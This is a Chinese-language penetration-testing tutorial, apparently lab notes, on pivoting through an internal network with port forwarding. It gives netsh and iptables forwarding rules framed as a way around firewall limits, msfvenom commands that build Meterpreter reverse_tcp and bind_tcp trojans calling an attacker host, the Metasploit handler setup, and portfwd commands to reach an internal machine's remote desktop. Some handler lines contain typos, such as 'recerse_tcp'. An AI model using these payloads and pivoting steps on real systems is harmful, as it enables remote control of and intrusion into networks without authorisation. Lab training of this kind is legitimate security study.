[TOC]



# ==内网端口转发==

#### 一、使用netsh进行端口转发

##### 1、配置端口转发

（1）先在Windows7上启动一个Xampp的服务（80端口），或者其他服务。

（2）在Windows2016服务器上，运行以下命令，完成端口转发。

```shell
netsh interface portproxy add v4tov4 listenport=8888 connectaddress=10.10.10.129 connectport=80
```

> - `interface portproxy`：这部分指定了要操作的类别是端口代理，用于配置网络接口的端口转发或代理功能。
> - `add v4tov4`：这表示要添加一个新的IPv4到IPv4的代理规则。`v4tov4`明确指出了源地址和目标地址都是IPv4地址。
>
> 在本地计算机上配置一个端口代理，使得所有发送到本地8888端口的请求都会被转发到`10.10.10.129`的80端口上。这种配置常用于绕过某些网络限制（如防火墙规则），或者为了在内网环境中模拟外部服务的访问。
>
> 对于 Windows Server 2016 来说，访问 localhost:8888 会将流量转发到 windows 7 的  10.10.10.129:80 然后 Windows 7 的 响应数据也会返回给 Windows Server 2016

##### 2、测试端口转发

（1）在Kali上访问`http://192.168.1.104:8888/dashboard/phpinfo.php`，PHPINFO显示这是一台Windows7的主机，端口转发成功。

![image-20240929230122556](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240929230122556.png)

（2）在Windows 2016上，运行以下命令可以查看端口转发列表。

```
netsh interface portproxy show all
```

![image-20240929230152861](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240929230152861.png)

（3）此时，在Windows2016的服务器上，直接可以使用localhost进行访问。

![image-20240929230401604](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240929230401604.png)

以上测试说明，端口转发是可以实现的，接下来使用 msf 框架进行端口转发实现内网渗透

##### 3、清除转发规则

```shell
netsh interface portproxy delete v4tov4 listenport=8888
netsh interface portproxy reset
```

![image-20240929230511094](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240929230511094.png)

如果Windows2016的防火墙限制了8888的端口访问，则此时端口转发将无法生效，所以，还需要寻找更多解决方案。

![image-20211206025111066](https://gitee.com/ymq_typroa/typroa/raw/main/20211206025111.png)

##### 4、Linux上的端口转发

```shell
# iptables需要先开启：net.ipv4.ip_forward = 1 允许远程转发
iptables -t nat -A POSTROUTING -d 192.168.112.153 -p tcp --dport 8088 -j SNAT --to 192.168.112.188
# firewall需要开启IP伪装：firewall-cmd --add-masquerade
firewall-cmd --add-forward-port=port=8888:proto=tcp:toaddr=101.37.65.91:toport=80
```

#### 二、使用Meterpreter进行端口转发

##### 1、为代理主机生成木马

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.100.103 LPORT=6666 -f exe -o win_shell.exe
```

![image-20240930092715733](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930092715733.png)

将上述木马运行于Windows2016服务器上，获取到Meterprter反弹连接。

##### 2、为代理主机配置端口转发

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.100.103
set lport 6666
set payload /windows/meterpreter/recerse_tcp
run

# 在Windows 2016上启动木马，获取Meterpreter，然后配置端口转发参数给Windows 2016

meterpreter > portfwd add -l 9999 -r 10.10.10.129 -p 80
[*] Local TCP relay created: :9999 <-> 10.10.10.129:80
```

![image-20240930104704654](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930104704654.png)

##### 3、在Kali上直接访问localhost:9999

![image-20240930104840698](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930104840698.png)

> 注意这里是
>
> - 木马的监听端口是6666
> - kali 端口转发监听的端口是 9999

##### 4、在Kali上访问Windows7的远程桌面

（1）先确保Windows7的远程桌面服务已经启动。

![image-20211206033516187](https://gitee.com/ymq_typroa/typroa/raw/main/20211206033516.png)

（2）在Meterpreter中执行命令：`meterpreter > portfwd add -l 8839 -r 10.10.10.129 -p 3389`

![image-20240930110341776](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930110341776.png)

（3）在Kali中运行命令：`rdesktop 127.0.0.1:8839` 完成远程桌面访问。

![image-20240930110545358](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930110545358.png)

![image-20211206033946501](https://gitee.com/ymq_typroa/typroa/raw/main/20211206033946.png)

（4）以类似的方式，也可以直接将 Windows 2016 的3389端口转发到Kali本地，实现对代理主机的远程访问。比如

`portfwd add -l 8839 -r 10.10.100.104 -p 80`

#### 三、使用Meterpreter实现正向连接

##### 1、生成正向后门

```
msfvenom -p windows/meterpreter/bind_tcp -f exe -o shell.exe
```

##### 2、运行以下指令完成正向连接

```
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set lport 4444
set rhost 192.168.112.160
set payload /windows/meterpreter/recerse_tcp
run
```

